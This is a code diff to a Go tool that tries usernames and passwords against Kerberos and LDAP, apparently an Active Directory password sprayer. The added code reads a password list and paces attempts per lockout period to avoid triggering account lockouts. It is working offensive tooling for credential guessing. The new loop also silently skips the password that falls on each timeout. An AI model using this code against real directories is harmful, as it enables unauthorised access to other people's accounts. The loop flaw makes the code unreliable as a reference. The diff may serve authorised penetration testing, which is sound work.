@@ -53,6 +53,9 @@ type FlagOptions struct {
 	OutPut   string
 	user     string
 	userfile string
+	passfile string
+	lockout  float64
+	attempts float64
 	domain   string
 	pass     string
 	outFile  string
@@ -76,6 +79,9 @@ func options() *FlagOptions {
 	domain := flag.String("D", "", "Fully qualified domain to use")
 	user := flag.String("U", "", "Username to authenticate as")
 	userfile := flag.String("Userfile", "", "File containing the list of usernames")
+	passfile := flag.String("Passfile", "", "File containing the list of passwords")
+	lockout := flag.Float64("Lockout", 60, "Account lockout period in minutes")
+	attempts := flag.Float64("A", 3, "Authentication attempts per lockout period")
 	pass := flag.String("P", "", "Password to use")
 	outFile := flag.String("O", "", "File to append the results to")
 	sleep := flag.Float64("sleep", .5, "Time inbetween attempts")
@@ -86,7 +92,7 @@ func options() *FlagOptions {
 	flag.Parse()
 	debugging = *debug
 	debugWriter = os.Stdout
-	return &FlagOptions{host: *host, domain: *domain, user: *user, userfile: *userfile, hostfile: *hostfile, pass: *pass, outFile: *outFile, sleep: *sleep, enum: *enum, ldap: *ldap, kerb: *kerb}
+	return &FlagOptions{host: *host, domain: *domain, user: *user, userfile: *userfile, hostfile: *hostfile, pass: *pass, outFile: *outFile, sleep: *sleep, enum: *enum, ldap: *ldap, kerb: *kerb, passfile: *passfile, lockout: *lockout, attempts: *attempts}
 }
 
 func readfile(inputFile string) []string {
@@ -117,6 +123,7 @@ func main() {
 	var password string
 	var usernames []string
 	var services []string
+	var passwords []string
 	services = []string{"KERB", "LDAP"}
 	fmt.Println(`
   __________  ________  ___       ________  ________
@@ -170,11 +177,22 @@ func main() {
 		}
 	}
 
+	if opt.passfile != "" {
+		printDebug("Reading pass file %s\n", opt.passfile)
+		filePasswds := readfile(opt.passfile)
+		printDebug("Appending passwords %v\n", filePasswds)
+		for _, pwd := range filePasswds {
+			if pwd != "" {
+				passwords = append(passwords, pwd)
+			}
+		}
+	}
+
 	if opt.user == "" && opt.userfile == "" {
 		log.Fatal("Error: Please provide an username or list of usernames")
 	}
 
-	if opt.pass == "" && opt.enum == false {
+	if (opt.pass == "" && opt.passfile == "") && opt.enum == false {
 		log.Fatal("Error: Please provide a password or select the enumeration option")
 	}
 
@@ -199,44 +217,120 @@ func main() {
 		usernames = append(usernames, opt.user)
 	}
 
-	sleep := opt.sleep
-	domain := strings.ToUpper(opt.domain)
-	printDebug("Domain %v\tUsernames %v\tPasswords %v\tHosts %v\tServices %v\n", domain, usernames, password, hosts, services)
-	x := 0
-	rand.Seed(time.Now().Unix())
-	lenServices := len(services) - 1
-	for _, username := range usernames {
-		n := 0
-		if opt.hostfile != "" {
-			n = rand.Int() % (len(hosts) - 1)
+	if opt.pass != "" && opt.passfile != "" {
+		log.Fatal("Error: Please provide either a single password or a list of passwords")
+	}
+
+	// Going to make people confirm they really want to spray passwords
+	if opt.passfile != "" {
+		reader := bufio.NewReader(os.Stdin)
+		fmt.Print("[*] Warning: Selection option will spray multiple passwords and risk locking accounts. Do you want to continue? [y/n]: ")
+		text, _ := reader.ReadString('\n')
+		if !strings.Contains(text, "y") {
+			log.Fatal("[*] Shutting down")
 		}
-		if hosts[n] == "" {
-			return
-		}
-		time.Sleep(time.Duration(sleep) * time.Second)
-		auth := setup(services[x], hosts[n], domain, username, password, opt.enum)
-		result, forfile, _ := auth.Login()
-		fmt.Println(result)
-		if strings.Contains(result, "User's Account Locked") && opt.enum != true {
-			reader := bufio.NewReader(os.Stdin)
-			fmt.Print("[*] Account lock out detected - Do you want to continue.[y/n]: ")
-			text, _ := reader.ReadString('\n')
-			if strings.Contains(text, "y") {
-				continue
+		fmt.Print("\n")
+	}
+
+	// Normal execution logic
+	if (opt.pass != "" && opt.passfile == "") || opt.enum {
+		sleep := opt.sleep
+		domain := strings.ToUpper(opt.domain)
+		printDebug("Domain %v\tUsernames %v\tPasswords %v\tHosts %v\tServices %v\n", domain, usernames, password, hosts, services)
+		x := 0
+		rand.Seed(time.Now().Unix())
+		lenServices := len(services) - 1
+		for _, username := range usernames {
+			n := 0
+			if opt.hostfile != "" {
+				n = rand.Int() % (len(hosts) - 1)
 			}
-			log.Fatal("Shutting down")
-		}
-		if opt.outFile != "" {
-			forfile = forfile + "\n"
-			writefile(opt.outFile, forfile)
-		}
-		if lenServices == x {
-			x = 0
-		} else {
-			x++
+			if hosts[n] == "" {
+				return
+			}
+			time.Sleep(time.Duration(sleep) * time.Second)
+			auth := setup(services[x], hosts[n], domain, username, password, opt.enum)
+			result, forfile, _ := auth.Login()
+			fmt.Println(result)
+			if strings.Contains(result, "User's Account Locked") && opt.enum != true {
+				reader := bufio.NewReader(os.Stdin)
+				fmt.Print("[*] Account lock out detected - Do you want to continue.[y/n]: ")
+				text, _ := reader.ReadString('\n')
+				if strings.Contains(text, "y") {
+					continue
+				}
+				log.Fatal("Shutting down")
+			}
+			if opt.outFile != "" {
+				forfile = forfile + "\n"
+				writefile(opt.outFile, forfile)
+			}
+			if lenServices == x {
+				x = 0
+			} else {
+				x++
+			}
 		}
 	}
 
+	if opt.pass == "" && opt.passfile != "" {
+		var counter float64
+		counter = 0
+		// Use previous main function but iterate through passwords and automate stuff
+		for _, pwd := range passwords {
+			printDebug("This is the current value of counter: %f\n", counter)
+			if counter < opt.attempts {
+				fmt.Print(time.Now().Format("01-02-2006 15:04:05: "))
+				fmt.Printf("Using password: %s\n", pwd)
+				domain := strings.ToUpper(opt.domain)
+				printDebug("Domain %v\tUsernames %v\tPasswords %v\tHosts %v\tServices %v\n", domain, usernames, pwd, hosts, services)
+				x := 0
+				rand.Seed(time.Now().Unix())
+				lenServices := len(services) - 1
+				for _, username := range usernames {
+					n := 0
+					if opt.hostfile != "" {
+						n = rand.Int() % (len(hosts) - 1)
+					}
+					if hosts[n] == "" {
+						return
+					}
+					sleep := opt.sleep
+					time.Sleep(time.Duration(sleep) * time.Second)
+					auth := setup(services[x], hosts[n], domain, username, pwd, opt.enum)
+					result, forfile, _ := auth.Login()
+					fmt.Println(result)
+					if strings.Contains(result, "User's Account Locked") && opt.enum != true {
+						reader := bufio.NewReader(os.Stdin)
+						fmt.Print("[*] Account lock out detected - Do you want to continue.[y/n]: ")
+						text, _ := reader.ReadString('\n')
+						if strings.Contains(text, "y") {
+							continue
+						}
+						log.Fatal("Shutting down")
+					}
+					if opt.outFile != "" {
+						forfile = forfile + "\n"
+						writefile(opt.outFile, forfile)
+					}
+					if lenServices == x {
+						x = 0
+					} else {
+						x++
+					}
+				}
+				counter++
+			} else { //Timeout for the period defined
+				// Printing output with color because why not
+				color.Set(color.FgYellow, color.Bold)
+				fmt.Printf("\nHit timeout period - Sleeping for %v minutes...\n", opt.lockout)
+				fmt.Printf("Will resume at %s", time.Now().Add(time.Duration(opt.lockout)*time.Minute).Format("01-02-2006 15:04:05"))
+				time.Sleep(time.Duration(opt.lockout) * time.Minute)
+				color.Unset()
+				counter = 0
+			}
+		}
+	}
 }
 
 func setup(service, host, domain, username, password string, enum bool) Authenticator {
